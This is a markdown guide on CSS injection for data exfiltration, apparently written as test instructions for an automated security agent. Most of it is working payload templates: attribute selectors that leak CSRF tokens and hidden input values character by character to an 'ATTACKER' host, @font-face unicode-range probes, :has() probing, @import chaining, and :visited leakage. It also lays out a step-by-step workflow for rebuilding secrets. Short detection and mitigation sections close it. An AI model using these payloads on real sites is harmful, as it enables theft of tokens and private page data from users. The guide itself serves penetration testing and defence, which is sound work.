# CSS Injection & Data Exfiltration

## Overview

CSS injection abuses browser rendering behavior to:

- Trigger conditional network requests
- Infer DOM content via side-channels
- Leak sensitive attribute values character-by-character

**Core model:**

```
condition matches DOM → browser loads resource → attacker observes request → data inferred
```

---

## Agent Test Instructions

> For each technique below, the agent should:
> 1. Inject the payload into the target injection point
> 2. Monitor the attacker-controlled server (or DNS/HTTP log) for incoming requests
> 3. Correlate requests with expected characters to reconstruct the target value
> 4. Mark the technique as **confirmed** if a request matching the condition arrives

**Injection points to probe:**
- `<style>` blocks
- `style` attributes (`style="..."`)
- CSS file URLs loaded by the page
- `@import` rules
- `Content-Security-Policy` misconfigured `style-src`

---

## Techniques

---

### 1. Attribute Selector Exfiltration

**Target:** Input values, hidden fields, meta tags, any DOM attribute

**How it works:** CSS attribute selectors trigger resource loads when the condition matches.

**Payload template:**

```css
input[name="csrf"][value^="A"] { background: url("https://ATTACKER/A"); }
input[name="csrf"][value^="B"] { background: url("https://ATTACKER/B"); }
/* ... repeat for all characters */
```

**Selector operators:**

| Operator | Meaning     | Use                        |
| -------- | ----------- | -------------------------- |
| `^=`     | starts with | prefix enumeration         |
| `$=`     | ends with   | suffix enumeration         |
| `*=`     | contains    | substring search           |
| `=`      | exact match | confirmation of full value |

**Agent test steps:**
1. Identify the target attribute (e.g., `input[name="token"]`)
2. Generate one rule per character in the charset (A-Z, a-z, 0-9, `-`, `_`)
3. Inject all rules simultaneously
4. Observe which URL path is requested - that is the first character
5. Extend prefix: `input[value^="A0"]`, `input[value^="A1"]`, ... and repeat

**Expected result:** One request per matched prefix character

---

### 2. @font-face + unicode-range (Character Presence Detection)

**Target:** Visible text nodes in the DOM

**How it works:** Browsers only load fonts for characters actually rendered on the page.

**Payload template:**

```css
@font-face {
  font-family: probe;
  src: url("https://ATTACKER/?char=A");
  unicode-range: U+0041; /* A */
}
@font-face {
  font-family: probe;
  src: url("https://ATTACKER/?char=B");
  unicode-range: U+0042; /* B */
}
body { font-family: probe, sans-serif; }
```

**Agent test steps:**
1. Build one `@font-face` rule per character to detect (map char to unicode codepoint)
2. Apply `font-family: probe` to a broad selector (e.g., `body`, `p`, `div`)
3. Collect which codepoints trigger requests
4. Reconstruct the character set present in the page

**Expected result:** One request per character present in rendered text

---

### 3. :has() Selector (Parent-Relative Probing)

**Target:** Nested DOM structures, forms containing specific inputs

**How it works:** `:has()` lets a parent element react to child conditions, expanding reachable DOM.

**Payload template:**

```css
form:has(input[name="token"][value^="A"]) {
  background: url("https://ATTACKER/A");
}
```

**Agent test steps:**
1. Use when the injectable element is a parent/ancestor, not the direct target
2. Combine with attribute selectors for character enumeration
3. Same prefix-building loop as technique 1

**Browser support:** Chrome 105+, Firefox 121+, Safari 15.4+

---

### 4. @import Chaining (Multi-Stage Exfiltration)

**Target:** Scenarios where requests can encode ordering/sequence

**How it works:** Sequential `@import` requests can encode data through request order or URL structure.

**Payload template:**

```css
@import url("https://ATTACKER/stage1");
```

Server at `ATTACKER/stage1` responds with:

```css
@import url("https://ATTACKER/stage2?data=X");
```

**Agent test steps:**
1. Set up a controlled server that responds dynamically
2. First import fetches and returns next CSS based on previously leaked data
3. Chain stages to reconstruct multi-character secrets

---

### 5. State-Based Selectors (UI Interaction Leakage)

**Target:** Checkbox state, focus, visited links

**Payload template:**

```css
input[type="checkbox"]:checked {
  background: url("https://ATTACKER/checked");
}
a[href="/admin"]:visited {
  background: url("https://ATTACKER/visited-admin");
}
```

**Agent test steps:**
1. Inject payload
2. Trigger UI interaction (check box, visit link) or observe passively
3. Monitor for corresponding request

---

### 6. url() Resource Trigger (Baseline Confirmation)

**Target:** Confirm CSS injection is working before advanced techniques

**Payload template:**

```css
* {
  background-image: url("https://ATTACKER/cssinjected");
}
```

**Agent test steps:**
1. Inject this as a smoke test first
2. If `https://ATTACKER/cssinjected` receives a request, injection is confirmed
3. Proceed to data-leaking techniques

---

## Attack Workflow (Agent Execution Order)

```
Step 1: Confirm injection
  - Inject url() smoke test
  - Verify request received

Step 2: Identify target data
  - Input fields, hidden inputs, meta[name="csrf"], attributes

Step 3: Select technique
  - Attribute with known name   -> Technique 1 (attribute selectors)
  - Visible text                -> Technique 2 (font-face + unicode-range)
  - Nested DOM                  -> Technique 3 (:has())
  - Multi-stage / dynamic       -> Technique 4 (@import chaining)

Step 4: Character enumeration
  - Build rules for full charset: A-Z, a-z, 0-9, special chars
  - Inject batch, observe requests
  - Confirm first character, extend prefix, repeat

Step 5: Reconstruct value
  - Concatenate confirmed prefix characters until no further match
```

---

## Decision Table

| Target data type      | Technique                  | Selector example                         |
| --------------------- | -------------------------- | ---------------------------------------- |
| Input attribute value | Attribute selector (^=)    | `input[value^="X"]`                      |
| Visible text/chars    | @font-face unicode-range   | `unicode-range: U+0058`                  |
| Nested input in form  | :has()                     | `form:has(input[value^="X"])`            |
| Multi-step secret     | @import chaining           | server-controlled CSS chain              |
| Checkbox/radio state  | :checked                   | `input:checked { background: url(...) }` |

---

## Limitations

| Factor              | Impact                                         |
| ------------------- | ---------------------------------------------- |
| CSP style-src       | Blocks injected stylesheets if strict          |
| CSP font-src        | Blocks font-based exfiltration                 |
| CSP img-src         | Blocks background-image / url() loads          |
| Browser caching     | May suppress repeated requests for same URL    |
| CORS                | Does not apply to CSS resource loads (no CORS) |
| Dynamic DOM updates | Attribute selectors read static rendered value |

---

## Detection Indicators

- External `url()` references inside `<style>` blocks or style attributes
- `@font-face` rules pointing to off-domain sources
- High-volume single-character URL patterns (`/A`, `/B`, `/0`, ...)
- Sequential `@import` chains to attacker-controlled hosts

---

## Mitigations

```
Content-Security-Policy: style-src 'self'; font-src 'none'; img-src 'self'
```

- Sanitize all CSS inputs server-side before rendering
- Reject `url()` in user-controlled style values
- Disallow `@font-face` and `@import` in user CSS contexts
- Use a CSS allowlist (properties + values) rather than a denylist
